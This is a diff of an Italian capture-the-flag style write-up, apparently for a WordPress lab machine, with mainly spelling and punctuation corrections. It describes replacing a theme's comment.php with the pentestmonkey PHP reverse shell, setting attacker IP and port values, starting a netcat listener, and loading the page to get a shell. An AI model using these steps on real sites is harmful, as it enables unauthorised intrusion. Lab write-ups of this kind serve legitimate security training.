@@ -48,27 +48,27 @@ wordpress lavora principalmente a pagine sotto pagine e temi molti di quest'ulti
 quello che andrò a fare nei passaggi successivi userà un vulnerabilità del non controllo del codice.
 (spiegazione)
 
-su word press per andare a modificare i vari path del cms c'è un menu a tendina sulla destra. bene apritelo e andate nella sezione APPARENCE una volta fatto click vi si dovrebbe aprire un sotto menu con varie opzioni 
-andate a selezionare editor e successivamente vi si apre un menu sulla pagina (sulla destra) andate in questo menu e selezionate la sezione comment.php
-tramite questa sezione vi si apre un editor a schermo di questa pagina cancellate qualsiasi cosa ci sia scritta sopra in modo da rendere la pagina vuota e aggiungete una reverse shell (vi consiglio https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)
-ricardate di cambiare nel php questi valori 
+su word press per andare a modificare i vari path del cms c'è un menu a tendina sulla destra. apritelo e andate nella sezione APPARENCE, una volta fatto click vi si dovrebbe aprire un sotto menu con varie opzioni.
+andate a selezionare editor e successivamente vi si apre un menu sulla pagina (sulla destra), andate in questo menu e selezionate la sezione comment.php.
+tramite questa sezione vi si apre un editor a schermo di questa pagina cancellate qualsiasi cosa ci sia scritta sopra, in modo da rendere la pagina vuota e aggiungete una reverse shell (vi consiglio https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)
+ricordate di cambiare nel php questi valori 
 ```bash
 $ip = '127.0.0.1';  // CHANGE THIS 
 $port = 1234;       // CHANGE THIS
 ```
-mettete il vostro ip e la vostra porta dove ascolterete il traffico 
+mettete il vostro ip e la vostra porta dove ascolterete il traffico.
 
-ottimo salvate questa pagina con l'apposito tasto.
+salvate questa pagina con l'apposito tasto.
 
 
-ottimo ora avviamo l'ascolto sulla nostra macchina
+ora avviamo l'ascolto sulla nostra macchina.
 ```bash
 nc -lvnp porta scelta nel php
 es. nc -lvnp 1234
 ```
 ora tutto è pronto.
 
-chiamiamo il nostro php tramite url (provate ad indovinare quale è l'url) (hint: ricardatevi dove avete salvato il php)
+chiamiamo il nostro php tramite url (provate ad indovinare qual'è l'url) (hint: ricordatevi dove avete salvato il php)
 
 ecco qua che si avvia la nostra shell con l'utente shifu facciamo privesc
 ## PRIVESC
